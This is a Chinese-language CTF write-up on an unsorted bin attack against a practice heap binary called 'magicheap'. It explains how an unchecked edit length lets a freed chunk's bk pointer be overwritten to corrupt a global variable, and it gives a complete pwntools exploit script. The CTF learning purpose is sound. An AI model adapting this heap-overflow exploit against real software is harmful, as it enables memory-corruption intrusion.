---
title: Unsorted BIN Attack
date: 2018-07-26 08:37:40
tags: [CTF, PWN]
categories: PWN练习
---
# Unsorted bin attack白板pwn复现

​	这题可以用unsorted bin attack解决，64位下当>0x80大小的chunk被free时就会被分配到unsorted bin，而此题可以通过edit控制已经free掉的chunk的fd和bk，经过这么多天的刷题对堆题还是可以说是颇有感悟的，一般堆上的漏洞都发生在free后的chunk中，<!--more-->即我们可以通过溢出或其它方法修改已经free掉的chunk的fd、bk、pre_size、size等chunk_header中的元数据，修改指针指向，然后一般就能进行利用了。
这题就是这样，edit函数中对用户的输入长度没有做限制，导致攻击者可以通过溢出修改已free的chunk的fd和bk，这里通过修改bk指针使其指向magic-0x10，这样当之前delete后的chunk从unsorted bin中unlink后，magic-0x10的fd就指向了链表头部0x7f1c705ffb78，即magic的值就变为链表头部地址，之后输入choice就可以绕过了。

贴上exp：

```
from pwn import *

p=process('./magicheap')

magic=0x00000000006020C0

gdb.attach(p,'''

    break *0x0000000000400C8C

    continue

''')

def create(size,content):

    p.recvuntil('Your choice :')

    p.sendline('1')

    p.recvuntil('Size of Heap : ')

    p.sendline(str(size))

    p.recvuntil('Content of heap:')

    p.sendline(str(content))

def edit(index,size,content):

    p.recvuntil('Your choice :')

    p.sendline('2')

    p.recvuntil('Index :')

    p.sendline(str(index))

    p.recvuntil('Size of Heap : ')

    p.sendline(str(size))

    p.recvuntil('Content of heap : ')

    p.sendline(str(content))

def dele(index):

    p.recvuntil('Your choice :')

    p.sendline('3')

    p.recvuntil('Index :')

    p.sendline(str(index))

def exit():

    p.recvuntil('Your choice :')

    p.sendline('4')

create(0x80,'0000')

create(0x80,'1111')

create(0x80,'2222')

dele(1)

edit(0,0x100,'a'*0x80+p64(0)+p64(0x90)+p64(0)+p64(magic-0x10))

create(0x80,'3333')  # the chunk1(index 1) unlink (malloc ) from unsorted bin ,and the fake bk point to the main-arena 

create(0x80,'4444')

p.recvuntil('Your choice :')

p.sendline('4869')

print p.recv(1024)

p.interactive()

```

